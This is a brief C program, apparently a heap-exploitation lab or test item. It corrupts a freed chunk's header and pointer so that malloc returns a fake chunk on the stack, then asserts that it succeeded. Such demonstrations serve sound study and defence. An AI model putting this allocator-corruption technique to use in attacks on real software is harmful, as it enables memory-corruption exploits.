#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <assert.h>
int main() {
setbuf(stdout, NULL);
setbuf(stdin, NULL);
intptr_t stack_buffer[4] = {0};
//start 
intptr_t* victim = malloc(1040);
intptr_t* barrier = malloc(2);
free(victim);
stack_buffer[1] = 1056;
stack_buffer[3] = (intptr_t)stack_buffer;
victim[-1] = 0x30;
victim[1] = (intptr_t)stack_buffer; 
char *p2 = malloc(1040);
//end
assert(p2==(char *)&stack_buffer[2]);
printf("%s", "exp state arrive!");
}